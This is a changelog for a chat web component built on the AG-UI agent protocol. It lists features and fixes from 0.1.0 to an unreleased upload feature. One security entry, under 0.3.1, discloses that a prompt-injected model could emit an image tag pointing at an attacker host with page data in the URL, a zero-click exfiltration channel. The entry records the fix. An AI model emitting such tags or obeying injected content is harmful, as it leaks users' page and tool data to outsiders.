# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added

- **File uploads.** Set `data-attachments-url` (django-ag-ui's `AttachmentsView`)
  to reveal a 📎 picker + drag-and-drop on the composer. Each file uploads
  out-of-band (multipart, with the element's `headers`) into a pending tray —
  one chip per file with a progress bar, settling to `ready` or `error` (with
  retry / remove). On send, the ready files' refs render as read-only chips on
  the user bubble and travel to the agent: the wire stays vanilla AG-UI (only
  lightweight `{ id, name, mime, size }` refs, never bytes), the model learns the
  ids from a one-line run-context manifest, and reads contents server-side via
  the `read_attachment` tool. Refs persist on the message, so a restored
  conversation re-renders its chips.
- **Client-side guards** (instant feedback; the server stays authoritative):
  `data-attachment-accept` (an `<input accept>` list) and
  `data-attachment-max-bytes` (default 10 MiB, `0` disables).
- **New exports:** `uploadAttachment` + `UploadOptions`, the `AttachmentRef`
  type, and `messageAttachments`. `AgUiClient.send` gains an optional second
  `attachments` argument; the `ag-ui-submit` event `detail` now also carries
  `attachments`.

## [0.5.0] — 2026-06-24

### Added

- **Chat-history drawer.** A history toggle (☰) in the header opens a slide-over
  listing the user's past conversations (title · relative time · preview), with
  select, new chat, inline rename, and delete-with-confirm. The
  `ClientConversationStore` interface gains `listThreads` / `setActiveThread` /
  `renameThread` and a `ThreadMeta` row shape; the default `SessionStorageStore`
  now keeps a per-tab thread index so the drawer works with no server. Selecting
  a row switches the active conversation and replays its history. The drawer is a
  slide-over by default, with an inline side-panel variant for
  `placement="embedded"`.
- **Server-backed history via `data-threads-url`.** Set the attribute (to
  django-ag-ui's `ThreadsView` URL) and the drawer routes list / load / rename /
  delete through that endpoint via a new `RemoteConversationStore`, showing
  durable, cross-device threads. The client store remains the offline fallback;
  rename / delete apply optimistically.

## [0.4.0] — 2026-06-12

### Added

- **Cancel / stop a run.** `AgUiClient.cancel()` aborts the in-flight
  streaming request (`abortRun()` — AG-UI's transport-level cancel; the
  server observes the disconnect) and stops the multi-round run loop: tool
  calls collected before the abort are not executed and no further round
  starts (a frontend tool handler already running completes, but its result
  doesn't trigger a re-run). Safe no-op with no run in flight.
- **`onCancelled()` handler** on `AgUiClientHandlers` — the deliberate-stop
  sibling of `onError`. Partial assistant text stays in the transcript and
  is persisted (`onPersist`), so a reload shows the truncated exchange;
  `onSettled` still fires (terminal-rest guarantee). Both the
  abort-resolves and abort-rejects behaviours of `@ag-ui/client` are
  handled (its `runAgent` filters `AbortError` and resolves normally;
  re-throwing versions are caught via the error's name).
- **The Send button becomes Stop while a run is in flight** — same button,
  label + `aria-label` swap, `data-state="running"` for styling — through
  the whole interaction including between tool rounds. **Escape** in the
  composer also cancels (only when the skills palette is closed; the
  palette keeps its own Escape). After a cancel the transcript gets a muted
  **"⏹ Stopped"** note (`.stopped-note`), not an error bubble.
- **Cancelling declines an open confirmation card.**
  `requestConfirmation` accepts `ConfirmationOptions` with an
  `AbortSignal`; aborting resolves the pending decision as declined
  (`data-resolved="declined"`). A decision already made wins over a late
  abort.

### Changed

- `newChat()` now cancels any in-flight run before discarding the client —
  previously the old agent kept streaming into a cleared transcript.
- The Send button is no longer `disabled` during a run (it's the Stop
  control now); `AgUiClientHandlers.onCancelled` is required, so hosts
  implementing the handlers interface must add it.

## [0.3.1] — 2026-06-10

### Security

- **`<img>` is stripped from rendered assistant markdown by default.** A
  model-controlled `<img src="https://attacker/?d=...">` is fetched by the
  browser with no user interaction, which made the sanitizer allowlist a
  zero-click exfiltration channel for prompt-injected page data (page maps,
  state hooks, tool results). Hosts that trust their content can opt back in
  via the new `allowImages` element property (or `renderMarkdown(text,
  { allowImages: true })`); when enabled, DOMPurify still strips event
  handlers and `javascript:` URLs as before.

### Fixed

- **Rotated headers now reach the agent stream.** `HttpAgent` is built once
  per conversation with the headers baked into its constructor, so a rotated
  token (CSRF, short-lived JWT) never reached the agent endpoint and long
  sessions 401'd mid-conversation — even though the skills/tools catalog
  fetches already re-read `headers` per request. The element now passes a
  live `getHeaders` callback to the agent factory and `createHttpAgent`'s
  fetch wrapper overlays the fresh values on every request. Custom
  `agentFactory` implementations can read the new optional
  `HttpAgentOptions.getHeaders` to do the same.
- **Removed the phantom `./style.css` export.** `package.json` advertised
  `@artooi/ag-ui-web-component/style.css` → `dist/ag-ui-web-component.bundle.css`,
  but the build emits no CSS file (styles live as JS strings and are injected
  into the Shadow DOM), so importing the advertised path always failed.
- **The shared `marked` singleton is no longer mutated.** Module-scope
  `marked.setOptions({ gfm, breaks })` clobbered a host app's `marked`
  configuration whenever the dependency was deduped. Rendering now uses a
  local `Marked` instance; the global keeps its defaults.

### Added

- **Auto-prettified tool-card labels.** When no label is found anywhere in
  the chain (`x-summary` → `toolSummaries` → fetched `data-tools-url`
  catalog), cards now fall back to a prettified name (`list_projects` →
  "List projects") instead of the raw identifier. Exported as
  `prettifyToolName`.

## [0.3.0] — 2026-06-03

### Added
- **`data-tools-url` — server tool-label catalog.** On connect the element
  fetches a JSON catalog (`[{ name, summary, description? }]`) from the URL
  (with `headers`) and uses it to label tool-call cards for **server-side tools**
  whose schema never reaches the browser. Pairs with django-ag-ui's `tools/`
  endpoint, so a tool's label flows from its server-side source (drf-mcp
  `display_name`, `@tool(summary=…)`) with no per-tool client duplication.
  Per-card label precedence: the tool's own `x-summary` → an explicit
  `toolSummaries` entry → the fetched catalog → the raw name. Exports the
  `ToolCatalogEntry` type and the `parseToolCatalog` helper.

## [0.2.2] — 2026-06-02

### Added
- **Friendly tool-call card labels.** The built-in tools now carry `x-summary`
  labels (`navigate_to_route` → "Navigate", `list_routes` → "List pages",
  `read_page` → "Read the page", state-hook `read_*`/`set_*` → "Read/Update
  <name>"). For tools whose schema never reaches the browser — **server-side
  tools** (drf-mcp, `@tool` registry) — a new `toolSummaries: Record<string,
  string>` property maps tool name → label as a fallback (e.g.
  `chat.toolSummaries = { list_projects: "Search projects" }`).

### Changed
- A tool call that ends with **no client handler and no `TOOL_CALL_RESULT`** now
  settles the card as **"No result returned."** instead of the misleading
  "Executed on the server." (nothing executed it).

### Fixed
- **Incoming-text animations no longer double-fire.** Two distinct cases:
  - *End of stream:* `data-text-animation="word"` wrapped the finished assistant
    message into staggered `.word` spans on `TEXT_MESSAGE_END`, so a response
    that had already streamed in re-animated itself one word at a time. The word
    reveal now runs only when a message arrives **at once** (single text delta,
    or an error bubble); a message streamed across multiple deltas keeps its
    progressive reveal and isn't re-wrapped.
  - *Reload from memory:* on rehydrate the whole transcript mounts at once, so
    every restored assistant bubble animated its text in parallel (fade) or
    re-wrapped word-by-word — wrong, since it's old content, not arriving. Restored
    bubbles are now marked `message--restored`, excluded from the fade entrance
    animation and never word-wrapped, so history appears statically.

## [0.2.1] — 2026-06-02

### Added
- **Server-side tool results in the card.** The element now subscribes to
  AG-UI's `TOOL_CALL_RESULT` event and settles the matching tool-call card with
  the real server output (honouring the `data-tool-display` mode), instead of
  the generic "Executed on the server." placeholder — which remains only as a
  fallback when no result event is streamed.
- **Tool calls and results survive a page refresh.** History replay now
  reconstructs tool-call cards (from assistant `toolCalls`) and settles them
  from the persisted `tool` result messages, so a rehydrated transcript shows
  the full tool activity, not just the prose. Applies to every conversation
  store (the data was already persisted; only the replay was incomplete).

### Fixed
- **Pending indicator could hang after a server-only round.** A round whose
  tool calls were all server-side re-showed the "thinking" indicator after the
  run had already finished, leaving it stuck. The indicator is no longer shown
  speculatively for server tools, and a terminal `onSettled` guarantee clears
  it (and re-enables input) on every run-loop exit — including the
  `MAX_TOOL_ROUNDS` ceiling and errors.

## [0.2.0] — 2026-06-02

### Added
- **Markdown + HTML rendering** in assistant message bubbles (`renderMarkdown`),
  sanitised with DOMPurify (scripts, event handlers, and `javascript:` URLs
  stripped; links hardened with `target`/`rel`). User messages stay literal.
- **Pending indicator** — an animated "thinking" indicator shown while the agent
  is awaited (before the first token and between tool rounds), honouring
  `prefers-reduced-motion`.
- **New-chat button** in the header — clears the transcript, the persisted
  conversation, and the in-memory run state, and mints a fresh thread.
- **Collapse seam** — a reflected `collapsed` attribute, a built-in header
  toggle, a persisted (per-tab) collapsed state, and a `TOGGLE_EVENT`
  (`ag-ui-toggle`) so a host can drive its own chrome.
- **Tool-call display modes** (`TOOL_DISPLAY`, `data-tool-display`): `minimal`
  (name + status), `compact` (args + result behind one "Details" toggle), and
  `full` (the default; original behaviour).
- **Richer action animations**: `pressThenClick`, `selectOption`,
  `toggleControl` (+ `pressButton` / `selectControl` / `toggleCheckbox` driver
  wrappers), all honouring `prefers-reduced-motion`.
- **Dynamic route syntax**: `Route.path` supports `:name` placeholders;
  `navigate_to_route` substitutes path params (leftover params → query string)
  and `list_routes` advertises each route's `pathParams`.
- `X_CONFIRM_KEY` (`x-confirm`) tool metadata for a human-readable confirmation
  prompt.
- `setNativeValue` / `setNativeChecked` utilities (also used internally).
- **Theming** — a `theme` attribute (`light` / `dark` / `auto` / `code`); `auto`
  follows `prefers-color-scheme`, `code` is a monospace terminal palette. Plus a
  wider set of themeable `--ag-ui-*` variables.
- **Density + placement presets** — `density` (`comfortable` / `compact`) and
  `placement` (`bottom-left` / `side` / `full` / `embedded`); `embedded` drops
  the floating chrome and high z-index so the widget lives in the host layout.
- **Incoming-text animations** — `data-text-animation` (`none` / `fade` /
  `word`), the last revealing assistant text word-by-word; honours
  `prefers-reduced-motion`.
- **`confirmPredicate`** — a per-call `(toolName, args) => boolean | Promise`
  hook deciding confirmation dynamically (authoritative over `x-destructive`).
- **Built-in `read_page` tool** — present when a `getPageMap` provider is set, so
  the agent can re-read the page mid-turn after acting.
- **`x-summary`** tool metadata (`X_SUMMARY_KEY`) — a friendly label shown on the
  tool-call card instead of the raw tool name.
- `observedAttributes` / `attributeChangedCallback` so a late `title-text`
  change updates the header.
- Accessibility: `role="log"`/`aria-live` on the transcript, `role="status"` on
  the pending indicator, `role="group"` on the confirmation card, input label.
- **Skills** — pre-defined prompts surfaced as **chips** (`data-prompt-chips`)
  and/or a **`/`-command palette** (`data-slash-commands`), both opt-in over one
  catalog. Catalog from the `skills` setter (`setSkills`), a `data-skills` JSON
  embed, and/or a fetched `data-skills-url` (merged backend → embed → client).
  Picking pre-fills the input (or auto-sends with `sendImmediately`); prompts
  support `{placeholder}`s filled from `skillContext`, with a missing value
  blocking the send and showing a hint. Exports the `Skill` type.

### Changed
- The destructive-action confirmation is now an **inline card in the transcript**
  (Confirm / Cancel, with the `x-confirm` message) instead of a focus-stealing
  modal overlay. `requestConfirmation` now renders inline; the
  `confirmation_modal` module was removed.
- **Framework-controlled inputs now work.** `fillField` / `typeInto` /
  `selectOption` / `toggleControl` / `setControlValue` set `value` / `checked`
  through the **native prototype setter** before dispatching `input`, so
  React/Vue/Svelte value-tracking sees the change (previously the field looked
  filled but host state stayed empty).
- **Framework interop:** reflecting **property setters** for `endpoint`,
  `toolDisplay`, and `collapsed` (React 19 assigns matching props as element
  properties — getter-only props previously threw).
- `registerTool` is now **idempotent** — re-registering a tool name replaces it
  instead of throwing (re-fired refs / React StrictMode).

### Fixed
- The Markdown/HTML allowlist now permits sanitised **`<img>`** (safe-scheme
  `src`, no event handlers); `javascript:` srcs and disallowed tags (e.g.
  `iframe`) are still stripped.

## [0.1.1] — 2026-06-01

### Changed
- CI: resolve the pnpm version from `package.json`'s `packageManager` only
  (dropped the conflicting `version` input in the release/test workflows).

### Notes
- First fully-automated release via the npm OIDC publish pipeline — 0.1.0 was
  the manual bootstrap publish that created the package.

## [0.1.0] — 2026-06-01

### Added
- `<ag-ui-chat>` Web Component over AG-UI: Shadow-DOM chat UI, a pluggable tool
  registry (`registerTool`), the `x-destructive` confirmation modal, and the
  DOM-driver + animation primitives.
- Durable conversation + resumable run loop that survives the full page reloads
  of a multi-page app: `SessionStorageStore`, a persisted thread id, and
  `x-navigates` checkpoints completed via `navigationResult` on the next mount.
- Host seams: `routeMap` (+ `list_routes` / `navigate_to_route`), an
  auto-injected `getPageMap` context, `registerStateHook`, and an optional
  client-side `navigate()` callback (SPA vs MPA).

### Notes
- First release — exercising the automated npm OIDC publish pipeline end-to-end.

[Unreleased]: https://github.com/Artui/ag-ui-web-component/compare/v0.5.0...HEAD
[0.5.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.4.0...v0.5.0
[0.4.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.3.1...v0.4.0
[0.3.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.3.0...v0.3.1
[0.3.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.2.2...v0.3.0
[0.2.2]: https://github.com/Artui/ag-ui-web-component/compare/v0.2.1...v0.2.2
[0.2.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.2.0...v0.2.1
[0.2.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.1.1...v0.2.0
[0.1.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.1.0...v0.1.1
[0.1.0]: https://github.com/Artui/ag-ui-web-component/releases/tag/v0.1.0
